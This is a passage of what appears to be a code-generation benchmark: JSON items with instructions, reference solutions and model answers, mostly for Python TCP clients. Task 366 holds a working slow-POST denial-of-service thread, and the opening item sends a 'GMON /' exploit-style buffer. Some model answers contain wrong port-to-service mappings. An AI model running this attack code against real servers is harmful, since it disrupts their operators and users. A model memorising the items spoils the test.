    "right_result": "def send_buffer_to_server(host, port, buffer):\n    import socket\n\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)  # Set a timeout for the connection attempt\n        sock.connect((host, port))\n        print(f\"Connected to {host}:{port}\")\n\n        # Receive initial data from the server\n        initial_data = sock.recv(1024)\n        print(f\"Received initial data: {initial_data.decode()}\")\n\n        # Prepare the buffer with the prefix\n        prefixed_buffer = b\"GMON /\" + buffer.encode()\n        sock.sendall(prefixed_buffer)\n        print(\"Buffer sent with prefix\")\n\n        # Close the connection\n        sock.close()\n        print(\"Connection closed\")\n\n    except socket.timeout:\n        print(f\"Connection to {host}:{port} timed out\")\n    except ConnectionRefusedError:\n        print(f\"Connection to {host}:{port} was refused\")\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")"
  },
  {
    "Task_id": 361,
    "Instruction": "Task Description: Create a Python function that sends a TCP payload to a specified target server using socket programming.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, constructs an HTTP GET request with the provided payload, sends the request to the server, and then closes the connection. This is useful for testing TCP-based services or sending crafted HTTP requests.\n\nInput:\n- target_ip: [str] - The IP address of the target server to connect to\n- target_port: [int] - The port number on the target server to connect to\n- payload: [str] - The data to be included in the HTTP GET request path\n\nOutput: None (The function performs an action but doesn't return any value)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    \n    buf = (\n        \"GET /\" + payload + \" HTTP/1.1\\r\\n\" + \n        \"Host: \" + target_ip + \n        \"\\r\\n\\r\\n\"\n    )\n    \n    s.send(buf)\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    try:\n        # Create a TCP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)  # Set a timeout for the connection attempt\n\n        # Construct the HTTP GET request\n        http_request = f\"GET /{payload} HTTP/1.1\\r\\nHost: {target_ip}\\r\\nConnection: close\\r\\n\\r\\n\"\n\n        # Connect to the target server\n        sock.connect((target_ip, target_port))\n\n        # Send the HTTP request\n        sock.sendall(http_request.encode('utf-8'))\n\n        # Close the connection\n        sock.close()\n\n    except Exception as e:\n        print(f\"An error occurred: {e}\")"
  },
  {
    "Task_id": 362,
    "Instruction": "Task Description: Create a TCP client class for establishing and managing connections to a server, sending requests, and receiving responses using HDLC framing protocol.\n\nClass Description: TcpConnector is a class that handles TCP communication with a server using IPv4. It manages socket connection, sends requests with HDLC encapsulation, and continuously reads incoming data with HDLC decapsulation.\n\nAttributes:\n- socket: [socket.socket] - TCP socket object for communication\n- received_first_packet: [bool] - Flag indicating if first packet was received\n- packet_buffer: [bytes] - Buffer for storing incoming data\n- TRAILER_CHAR: [bytes] - Class constant for HDLC frame delimiter (assumed to be defined elsewhere in class)\n\nMethods:\n- __init__(address: str, port: int) -> None - Initializes TCP connection to specified address and port\n- send_request(packet_type: int, packet_payload: bytes) -> None - Sends HDLC-encapsulated request to server\n- read_loop() -> None - Continuously reads and processes incoming data using HDLC framing\n- __del__() -> None - Cleans up by closing socket connection\n- hdlc_encapsulate(data: bytes) -> bytes - (Assumed method) HDLC encapsulation implementation\n- hdlc_decapsulate(payload: bytes) -> bytes - (Assumed method) HDLC decapsulation implementation\n- dispatch_received_diag_packet(unframed_message: bytes) -> None - (Assumed method) Handles processed packets",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\nclass TcpConnector:\n    def __init__(self, address: str, port: int):\n        self.socket = socket(AF_INET, SOCK_STREAM)\n        try:\n            self.socket.connect((address, port))\n        except Exception:\n            raise ConnectionError('Could not communicate with the DIAG device through TCP')\n        \n        self.received_first_packet = False\n        self.packet_buffer = b''\n\n    def send_request(self, packet_type: int, packet_payload: bytes):\n        raw_payload = self.hdlc_encapsulate(bytes([packet_type]) + packet_payload)\n        self.socket.send(raw_payload)\n\n    def read_loop(self):\n        while True:\n            while self.TRAILER_CHAR not in self.packet_buffer:\n                socket_read = self.socket.recv(1024 * 1024 * 10)\n                self.packet_buffer += socket_read\n\n            while self.TRAILER_CHAR in self.packet_buffer:\n                raw_payload, self.packet_buffer = self.packet_buffer.split(self.TRAILER_CHAR, 1)\n\n                try:\n                    unframed_message = self.hdlc_decapsulate(\n                        payload=raw_payload + self.TRAILER_CHAR\n                    )\n                except self.InvalidFrameError:\n                    continue\n                finally:\n                    self.received_first_packet = True\n\n                self.dispatch_received_diag_packet(unframed_message)\n\n    def __del__(self):\n        self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass TcpConnector:\n    TRAILER_CHAR = b'\\x7e'\n\n    def __init__(self, address: str, port: int) -> None:\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.connect((address, port))\n        self.received_first_packet = False\n        self.packet_buffer = b''\n\n    def send_request(self, packet_type: int, packet_payload: bytes) -> None:\n        encapsulated = self.hdlc_encapsulate(packet_payload)\n        self.socket.sendall(encapsulated)\n\n    def read_loop(self) -> None:\n        while True:\n            data = self.socket.recv(1024)\n            self.packet_buffer += data\n            while self.packet_buffer:\n                if self.TRAILER_CHAR in self.packet_buffer:\n                    trailer_pos = self.packet_buffer.index(self.TRAILER_CHAR)\n                    frame = self.packet_buffer[:trailer_pos]\n                    self.packet_buffer = self.packet_buffer[trailer_pos + 1:]\n                    if not self.received_first_packet:\n                        self.received_first_packet = True\n                        self.dispatch_received_diag_packet(frame)\n                else:\n                    break\n\n    def __del__(self) -> None:\n        self.socket.close()\n\n    def hdlc_encapsulate(self, data: bytes) -> bytes:\n        return b'\\x7e' + data + self.TRAILER_CHAR\n\n    def hdlc_decapsulate(self, payload: bytes) -> bytes:\n        return payload.strip(self.TRAILER_CHAR)\n\n    def dispatch_received_diag_packet(self, unframed_message: bytes) -> None:\n        pass"
  },
  {
    "Task_id": 363,
    "Instruction": "Task Description: Implement a TCP client handler class that manages socket communication with a server, including sending and receiving data, handling connection states, and processing messages.\n\nClass Description: EventHandler is a TCP client handler that manages non-blocking socket communication with a server. It provides methods for sending and receiving data, handling connection states, and processing messages. The class uses threading locks to ensure thread-safe operations on the socket.\n\nAttributes:\n- _write_lock: threading.RLock - Lock for thread-safe write operations\n- _read_lock: threading.RLock - Lock for thread-safe read operations\n- address: tuple - Server address (IP, port) to connect to\n- outbuffer: bytes - Buffer for outgoing data\n- inbuffer: bytes - Buffer for incoming data\n- sock: socket.socket - TCP socket object\n- connected: bool - Connection state flag\n\nMethods:\n- __init__(address: tuple, sock: socket.socket=None) -> None - Initializes the handler with server address and optional existing socket\n- fileno() -> int - Returns socket file descriptor for select()\n- send() -> int - Sends data from outbuffer to server (returns bytes sent)\n- recv() -> None - Receives data from server and processes messages\n- push(data: bytes) -> None - Adds data to outbuffer for sending\n- handle_read(data: bytes) -> None - Abstract method to handle received data (must be implemented)\n- process_message() -> None - Abstract method to process complete messages (must be implemented)\n- ready_to_read() -> bool - Returns if ready for reading (default True)\n- ready_to_write() -> bool - Returns if ready for writing (default True)\n- close() -> None - Closes the socket connection",
    "Canonical_solution": "import os\nimport sys\nimport time\nimport errno\nimport socket\nimport select\nimport logging\nimport threading\n\nclass EventHandler:\n    def __init__(self, address: tuple, sock: socket.socket=None) -> None:\n        self._write_lock = threading.RLock()\n        self._read_lock = threading.RLock()\n        self.address = address\n        self.outbuffer = b''\n        self.inbuffer = b''\n        self.sock = sock if sock is not None else socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect(address)\n        self.connected = True\n        self.sock.setblocking(False)\n\n    def fileno(self) -> int:\n        return self.sock.fileno()\n\n    def send(self) -> int:\n        with self._write_lock:\n            while len(self.outbuffer) > 0:\n                try:\n                    sent = self.sock.send(self.outbuffer)\n                    self.outbuffer = self.outbuffer[sent:]\n                except socket.error as error:\n                    if error.args[0] == errno.EAGAIN:\n                        time.sleep(0.1)\n                    elif error.args[0] in (errno.ECONNRESET, errno.ENOTCONN, errno.ESHUTDOWN, errno.ECONNABORTED, errno.EPIPE):\n                        self.close()\n                        return 0\n                    elif os.name == 'posix':\n                        if sys.platform == 'darwin' and error.args[0] == errno.EBADF:\n                            self.close()\n                            return 0\n                        elif error.args[0] == errno.EBADFD:\n                            self.close()\n                            return 0\n                        raise\n                    else:\n                        raise\n\n    def recv(self) -> None:\n        try:\n            data = self.sock.recv(4096)\n        except socket.error as error:\n            if error.args[0] in (errno.EWOULDBLOCK, errno.EAGAIN):\n                return None\n            elif error.args[0] == errno.ECONNRESET:\n                self.close()\n                return None\n            else:\n                raise\n\n        if not data:\n            self.close()\n            return None\n\n        self.inbuffer += data\n\n        while self.inbuffer:\n            match = b'\\r\\n'\n            index = self.inbuffer.find(match)\n            if index != -1:\n                if index > 0:\n                    self.handle_read(self.inbuffer[:index])\n                self.inbuffer = self.inbuffer[index+len(match):]\n                self.process_message()\n            else:\n                index = len(match) - 1\n                while index and not self.inbuffer.endswith(match[:index]):\n                    index -= 1\n                if index:\n                    if index != len(self.inbuffer):\n                        self.handle_read(self.inbuffer[:-index])\n                        self.inbuffer = self.inbuffer[-index:]\n                    break\n                else:\n                    self.handle_read(self.inbuffer)\n                    self.inbuffer = b''\n\n    def push(self, data: bytes) -> None:\n        self.outbuffer += data\n\n    def handle_read(self, data: bytes) -> None:\n        raise NotImplementedError('You have to implement this method')\n\n    def process_message(self) -> None:\n        raise NotImplementedError('You have to implement this method')\n\n    def ready_to_read(self) -> bool:\n        return True\n\n    def ready_to_write(self) -> bool:\n        return True\n\n    def close(self) -> None:\n        self.sock.close()\n        self.connected = False",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport threading\n\nclass EventHandler:\n    def __init__(self, address: tuple, sock: socket.socket = None):\n        self._write_lock = threading.RLock()\n        self._read_lock = threading.RLock()\n        self.address = address\n        self.outbuffer = b''\n        self.inbuffer = b''\n        self.sock = sock or socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.connected = False\n\n    def fileno(self) -> int:\n        return self.sock.fileno()\n\n    def send(self) -> int:\n        with self._write_lock:\n            if not self.outbuffer:\n                return 0\n            bytes_sent = self.sock.send(self.outbuffer)\n            self.outbuffer = self.outbuffer[bytes_sent:]\n            return bytes_sent\n\n    def recv(self) -> None:\n        with self._read_lock:\n            while True:\n                try:\n                    data = self.sock.recv(4096)\n                    if not data:\n                        break\n                    self.inbuffer += data\n                    self.handle_read(self.inbuffer)\n                    self.inbuffer = b''\n                except Exception as e:\n                    break\n\n    def push(self, data: bytes) -> None:\n        with self._write_lock:\n            self.outbuffer += data\n\n    def handle_read(self, data: bytes) -> None:\n        pass\n\n    def process_message(self) -> None:\n        pass\n\n    def ready_to_read(self) -> bool:\n        return True\n\n    def ready_to_write(self) -> bool:\n        return True\n\n    def close(self) -> None:\n        self.sock.close()"
  },
  {
    "Task_id": 365,
    "Instruction": "Task Description: Create a Python function that implements a TCP client for basic communication with a server using sockets. The function should establish a connection, send a message, receive a response, and close the connection.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a message, receives a response, and then closes the connection. It handles IPv4 addresses and uses a stream-oriented connection (TCP).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the server. Defaults to 'localhost'.\n- `port` (int, optional): The port number on which the server is listening. Defaults to 20000.\n- `message` (bytes, optional): The message to send to the server. Defaults to b'Hello\\n'.\n\nOutput:\n- `resp` (bytes): The response received from the server.",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\ndef tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    s = socket(AF_INET, SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    resp = s.recv(8192)\n    s.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "def tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    import socket\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect((host, port))\n    client_socket.sendall(message)\n    resp = client_socket.recv(1024)\n    client_socket.close()\n    return resp"
  },
  {
    "Task_id": 366,
    "Instruction": "Task Description: Create a Python class that implements a threaded TCP client for sending HTTP requests to a target server, with configurable request methods and target sites.\n\nClass Description: MyThread is a Thread subclass designed to repeatedly send HTTP requests to a specified web server. It supports different HTTP methods and includes functionality to terminate the thread. The class handles socket creation, connection establishment, request sending, and connection cleanup.\n\nAttributes:\n- method: str - The HTTP method to use for requests (e.g., GET, POST)\n- site: str - The target website domain to connect to\n- kill_received: bool - Flag to control thread termination\n\nMethods:\n- __init__(site: str, dos_type: str) -> None - Initializes the thread with target site and HTTP method\n- run() -> None - Main thread execution method that handles the TCP connection and request sending loop\n- (Inherited from Thread) start() -> None - Begins thread execution\n- (Inherited from Thread) join() -> None - Waits for thread to complete",
    "Canonical_solution": "import sys\nimport socket\nimport time\nfrom threading import Thread\n\nclass MyThread(Thread):\n    def __init__(self, site, dos_type):\n        Thread.__init__(self)\n        self.method = dos_type\n        self.site = site\n        self.kill_received = False\n\n    def run(self):\n        while not self.kill_received:\n            server = socket.gethostbyname(self.site)\n            post = 'x' * 9999\n            file = '/'\n\n            request = '%s /%s HTTP/1.1\\r\\n' % (self.method.upper(), file)\n            request += 'Host: %s\\r\\n' % (self.site)\n            request += 'User-Agent: Mozilla/5.0 (Windows; U;Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026Firefox/3.6.12\\r\\n'\n            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n'\n            request += 'Accept-Language: en-us,en;q=0.5\\r\\n'\n            request += 'Accept-Encoding: gzip,deflate\\r\\n'\n            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n'\n            request += 'Keep-Alive: 9000\\r\\n'\n            request += 'Connection: close\\r\\n'\n            request += 'Content-Type: application/x-www-form-urlencoded\\r\\n'\n            request += 'Content-length: %s\\r\\n\\r\\n' % (len(post))\n\n            newrequest = '%s\\r\\n' % (post)\n            newrequest += '\\r\\n'\n\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n            try:\n                s.connect((server, 80))\n                s.send(request)\n\n                for c in newrequest:\n                    sys.stdout.write(s.send(c).__str__())\n                    time.sleep(60)\n                s.close()\n            except:\n                print \"Target Down?\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport threading\n\nclass MyThread(threading.Thread):\n    def __init__(self, site: str, dos_type: str):\n        super().__init__()\n        self.method = dos_type\n        self.site = site\n        self.kill_received = False\n\n    def run(self):\n        while not self.kill_received:\n            try:\n                # Create a TCP socket\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.settimeout(5)  # Set a timeout for the connection attempt\n\n                # Connect to the target server\n                host = self.site\n                port = 80  # Default HTTP port\n                sock.connect((host, port))\n\n                # Construct the HTTP request\n                if self.method == \"GET\":\n                    request = f\"GET / HTTP/1.1\\r\\nHost: {host}\\r\\nConnection: close\\r\\n\\r\\n\"\n                elif self.method == \"POST\":\n                    request = f\"POST / HTTP/1.1\\r\\nHost: {host}\\r\\nConnection: close\\r\\nContent-Length: 0\\r\\n\\r\\n\"\n                else:\n                    request = f\"{self.method} / HTTP/1.1\\r\\nHost: {host}\\r\\nConnection: close\\r\\n\\r\\n\"\n\n                # Send the request\n                sock.sendall(request.encode())\n\n                # Receive and discard the response\n                while True:\n                    data = sock.recv(4096)\n                    if not data:\n                        break\n\n                # Close the connection\n                sock.close()\n            except Exception as e:\n                print(f\"Error: {e}\")\n            finally:\n                pass  # No need to do anything here, as the loop will continue\n\n    def kill_thread(self):\n        self.kill_received = True"
  },
  {
    "Task_id": 367,
    "Instruction": "Task Description: Create a TCP client class in Python that can connect to a server, send and receive data, and manage the connection lifecycle.\n\nClass Description: TCPClient is a class that implements TCP client functionality using Python's socket module. It handles connection establishment, data transmission, and connection termination with a TCP server.\n\nAttributes:\n- s: Optional[socket.socket] - The socket object used for communication, initialized as None when not connected\n\nMethods:\n- connect(host: str, port: int) -> None - Establishes a connection to the specified host and port after validating the input parameters\n- send_data(data: str) -> None - Sends UTF-8 encoded string data to the connected server\n- receive_data() -> bytes - Receives all available data from the server until the connection is closed\n- close() -> None - Closes the socket connection and resets the socket attribute\n- _dotted_quad_to_num(ip: str) -> int - (Private method) Converts a dotted quad IP address string to its integer representation",
    "Canonical_solution": "import socket\nimport re\nimport ipaddress\nfrom typing import Optional\n\nclass TCPClient:\n    def __init__(self):\n        self.s: Optional[socket.socket] = None\n\n    def connect(self, host: str, port: int) -> None:\n        \"\"\"\n        Connect to a TCP server\n        Args:\n            host: Target host IP or domain\n            port: Target port number\n        \"\"\"\n        if not re.match(r\"^\\d+$\", str(port)):\n            raise ValueError(f\"Invalid port number: {port}\")\n\n        if re.match(r\"^\\d+$\", host):\n            address = int(host)\n        elif re.match(r\"^[\\d\\.]+$\", host):\n            address = self._dotted_quad_to_num(host)\n        else:\n            raise ValueError(\"DNS resolution not implemented\")\n\n        if ipaddress.ip_address(address).is_private:\n            raise ValueError(\"Private IP addresses not allowed\")\n\n        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.s.connect((host, port))\n\n    def send_data(self, data: str) -> None:\n        \"\"\"\n        Send data to the connected server\n        Args:\n            data: String data to send\n        \"\"\"\n        if self.s:\n            self.s.send(data.encode('utf8'))\n\n    def receive_data(self) -> bytes:\n        \"\"\"\n        Receive data from the connected server\n        Returns:\n            Received bytes data\n        \"\"\"\n        if not self.s:\n            return b\"\"\n\n        data = b\"\"\n        while True:\n            packet = self.s.recv(1024)\n            if not packet:\n                break\n            data += packet\n        return data\n\n    def close(self) -> None:\n        \"\"\"\n        Close the socket connection\n        \"\"\"\n        if self.s:\n            self.s.close()\n            self.s = None\n\n    def _dotted_quad_to_num(self, ip: str) -> int:\n        \"\"\"\n        Convert decimal dotted quad string to integer\n        Args:\n            ip: IP address string\n        Returns:\n            Integer representation of IP\n        \"\"\"\n        ip32bit = socket.inet_aton(ip)\n        return struct.unpack(\"I\", ip32bit)[0]",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass TCPClient:\n    def __init__(self):\n        self.s = None\n\n    def connect(self, host: str, port: int) -> None:\n        if not isinstance(host, str) or not isinstance(port, int):\n            raise ValueError(\"Invalid host or port\")\n        if port < 1 or port > 65535:\n            raise ValueError(\"Port out of range\")\n        try:\n            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.s.connect((host, port))\n        except Exception as e:\n            raise ConnectionError(f\"Connection failed: {e}\")\n\n    def send_data(self, data: str) -> None:\n        if self.s is None:\n            raise RuntimeError(\"Not connected to a server\")\n        if not isinstance(data, str):\n            raise TypeError(\"Data must be a string\")\n        try:\n            self.s.sendall(data.encode('utf-8'))\n        except Exception as e:\n            raise ConnectionError(f\"Failed to send data: {e}\")\n\n    def receive_data(self) -> bytes:\n        if self.s is None:\n            raise RuntimeError(\"Not connected to a server\")\n        try:\n            return self.s.recv(4096)\n        except Exception as e:\n            raise ConnectionError(f\"Failed to receive data: {e}\")\n\n    def close(self) -> None:\n        if self.s is not None:\n            self.s.close()\n            self.s = None\n\n    def _dotted_quad_to_num(self, ip: str) -> int:\n        if not isinstance(ip, str):\n            raise TypeError(\"IP address must be a string\")\n        parts = ip.split('.')\n        if len(parts) != 4:\n            raise ValueError(\"Invalid IP address format\")\n        try:\n            return int(parts[0]) << 24 | int(parts[1]) << 16 | int(parts[2]) << 8 | int(parts[3])\n        except ValueError:\n            raise ValueError(\"Invalid IP address components\")"
  },
  {
    "Task_id": 369,
    "Instruction": "Task Description: Create a Python function that scans a target host and port for open TCP connections and attempts to retrieve service information from the connected port.\n\nFunction Description: The function should attempt to establish a TCP connection to the specified host and port, with a timeout of 1 second. If successful, it should try to receive initial data from the service (up to 1024 bytes). The function should process the received data by filtering non-printable characters and truncating long responses. The results should be stored in a global dictionary with information about the port's protocol, service, and state.\n\nInput:\n- target: tuple - A tuple containing (host, port) where host is the target IP address or hostname (string) and port is the target port number (integer or string)\n\nOutput:\n- None - The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n      host: {\n          port: {\n              'protocol': string,\n              'service': string,\n              'state': string\n          }\n      }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport socketserver\nimport sys\nimport re\n\nresults = {}\n\ndef scan_target(target):\n    host, port = target\n    try:\n        with socket.create_connection((host, int(port)), timeout=1):\n            # Attempt to receive initial data from the service\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(1)\n            s.connect((host, int(port)))\n            data = s.recv(1024)\n            s.close()\n            \n            # Filter non-printable characters and truncate long responses\n            filtered_data = ''.join([c for c in data if c.isprintable() or c.isspace()])\n            filtered_data = filtered_data[:1024]\n            \n            # Determine protocol\n            protocol = 'TCP'\n            \n            # Determine service (try to guess based on common ports)\n            service = 'Unknown'\n            if port == 21:\n                service = 'FTP'\n            elif port == 22:\n                service = 'SSH'\n            elif port == 23:\n                service = 'Telnet'\n            elif port == 25:\n                service = 'SMTP'\n            elif port == 53:\n                service = 'DNS'\n            elif port == 80:\n                service = 'HTTP'\n            elif port == 443:\n                service = 'HTTPS'\n            elif port == 139:\n                service = 'NetBIOS'\n            elif port == 445:\n                service = 'SMB'\n            elif port == 110:\n                service = 'POP3'\n            elif port == 143:\n                service = 'IMAP'\n            elif port == 995:\n                service = 'IMAPS'\n            elif port == 111:\n                service = 'RPC'\n            elif port == 1720:\n                service = 'H323'\n            elif port == 389:\n                service = 'LDAP'\n            elif port == 631:\n                service = 'IPP'\n            elif port == 88:\n                service = 'Kerberos'\n            elif port == 546:\n                service = 'DHCP'\n            elif port == 547:\n                service = 'DHCPv6'\n            elif port == 389:\n                service = 'LDAP'\n            elif port == 631:\n                service = 'IPP'\n            elif port == 106:\n                service = 'SNMP'\n            elif port == 161:\n                service = 'SNMP'\n            elif port == 162:\n                service = 'SNMP Trap'\n            elif port == 2049:\n                service = 'NFS'\n            elif port == 5060:\n                service = 'SIP'\n            elif port == 5061:\n                service = 'SIPS'\n            elif port == 3261:\n                service = 'RDP'\n            elif port == 5900:\n                service = 'VNC'\n            elif port == 3389:\n                service = 'RDP'\n            elif port == 22:\n                service = 'SSH'\n            elif port == 23:\n                service = 'Telnet'\n            elif port == 21:\n                service = 'FTP'\n            elif port == 25:\n                service = 'SMTP'\n            elif port == 80:\n                service = 'HTTP'\n            elif port == 443:\n                service = 'HTTPS'\n            elif port == 53:\n                service = 'DNS'\n            elif port == 110:\n                service = 'POP3'\n            elif port == 143:\n                service = 'IMAP'\n            elif port == 995:\n                service = 'IMAPS'\n            elif port == 111:\n                service = 'RPC'\n            elif port == 1720:\n                service = 'H323'\n            elif port == 389:\n                service = 'LDAP'\n            elif port == 631:\n                service = 'IPP'\n            elif port == 88:\n                service = 'Kerberos'\n            elif port == 546:\n                service = 'DHCP'\n            elif port == 547:\n                service = 'DHCPv6'\n            elif port == 106:\n                service = 'SNMP'\n            elif port == 161:\n                service = 'SNMP'\n            elif port == 162:\n                service = 'SNMP Trap'\n            elif port == 2049:\n                service = 'NFS'\n            elif port == 5060:\n                service = 'SIP'\n            elif port == 5061:\n                service = 'SIPS'\n            elif port == 3261:\n                service = 'RDP'\n            elif port == 5900:\n                service = 'VNC'\n            elif port == 3389:\n                service = 'RDP'\n            else:\n                service = 'Unknown'\n            \n            # Determine state\n            state = 'Open'\n            \n            # Store results in the global dictionary\n            if host not in results:\n                results[host] = {}\n            if port not in results[host]:\n                results[host][port] = {}\n            results[host][port]['protocol'] = protocol\n            results[host][port]['service'] = service\n            results[host][port]['state'] = state\n    except (socket.timeout, ConnectionRefusedError):\n        # If connection is refused or timeout, mark as closed\n        state = 'Closed'\n        if host not in results:\n            results[host] = {}\n        if port not in results[host]:\n            results[host][port] = {}\n        results[host][port]['protocol'] = 'TCP'\n        results[host][port]['service'] = 'Closed'\n        results[host][port]['state'] = state"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Implement a TokenManager class that handles the generation and management of various TikTok authentication tokens (msToken, ttwid, odin_tt) through HTTP requests using the httpx library.\n\nClass Description: The TokenManager class is responsible for managing TikTok authentication tokens by interacting with TikTok's API endpoints. It reads configuration from a YAML file, handles token generation (both real and fallback tokens), and manages HTTP requests with retries and proxy support.\n\nAttributes:\n- token_conf: [dict] - Configuration for msToken generation including URL, headers, and payload data\n- ttwid_conf: [dict] - Configuration for ttwid generation including URL and request data\n- odin_tt_conf: [dict] - Configuration for odin_tt generation including URL\n- proxies: [dict] - Proxy configuration for HTTP and HTTPS connections\n\nMethods:\n- __init__() -> [None] - Initializes the TokenManager by loading configuration from config.yaml\n- gen_real_msToken() -> [str] - Generates a real msToken by making a POST request to TikTok's API endpoint\n- gen_false_msToken() -> [str] - Generates a fallback msToken with random characters when real token generation fails\n- gen_ttwid(cookie: str) -> [str] - Generates a ttwid by making a POST request with the provided cookie\n- gen_odin_tt() -> [str] - Generates an odin_tt by making a GET request to TikTok's endpoint",
    "Canonical_solution": "import os\nimport json\nimport yaml\nimport httpx\nimport asyncio\nfrom typing import Union\n\nclass TokenManager:\n    def __init__(self):\n        path = os.path.abspath(os.path.dirname(__file__))\n        with open(f\"{path}/config.yaml\", \"r\", encoding=\"utf-8\") as f:\n            config = yaml.safe_load(f)\n        \n        tiktok_manager = config.get(\"TokenManager\").get(\"tiktok\")\n        self.token_conf = tiktok_manager.get(\"msToken\", None)\n        self.ttwid_conf = tiktok_manager.get(\"ttwid\", None)\n        self.odin_tt_conf = tiktok_manager.get(\"odin_tt\", None)\n        proxies_conf = tiktok_manager.get(\"proxies\", None)\n        self.proxies = {\n            \"http://\": proxies_conf.get(\"http\", None),\n            \"https://\": proxies_conf.get(\"https\", None),\n        }\n\n    def gen_real_msToken(self) -> str:\n        payload = json.dumps({\n            \"magic\": self.token_conf[\"magic\"],\n            \"version\": self.token_conf[\"version\"],\n            \"dataType\": self.token_conf[\"dataType\"],\n            \"strData\": self.token_conf[\"strData\"],\n            \"tspFromClient\": get_timestamp(),\n        })\n\n        headers = {\n            \"User-Agent\": self.token_conf[\"User-Agent\"],\n            \"Content-Type\": \"application/json\",\n        }\n\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.token_conf[\"url\"], headers=headers, content=payload\n                )\n                response.raise_for_status()\n                msToken = str(httpx.Cookies(response.cookies).get(\"msToken\"))\n                return msToken\n            except Exception as e:\n                logger.error(f\"\u751f\u6210TikTok msToken API\u9519\u8bef\uff1a{e}\")\n                return self.gen_false_msToken()\n\n    def gen_false_msToken(self) -> str:\n        return gen_random_str(146) + \"==\"\n\n    def gen_ttwid(self, cookie: str) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.ttwid_conf[\"url\"],\n                    content=self.ttwid_conf[\"data\"],\n                    headers={\n                        \"Cookie\": cookie,\n                        \"Content-Type\": \"text/plain\",\n                    },\n                )\n                response.raise_for_status()\n                ttwid = httpx.Cookies(response.cookies).get(\"ttwid\")\n                if ttwid is None:\n                    raise APIResponseError(\"ttwid: \u68c0\u67e5\u6ca1\u6709\u901a\u8fc7, \u8bf7\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ttwid\")\n                return ttwid\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.ttwid_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")\n\n    def gen_odin_tt(self) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.get(self.odin_tt_conf[\"url\"])\n                response.raise_for_status()\n                odin_tt = httpx.Cookies(response.cookies).get(\"odin_tt\")\n                if odin_tt is None:\n                    raise 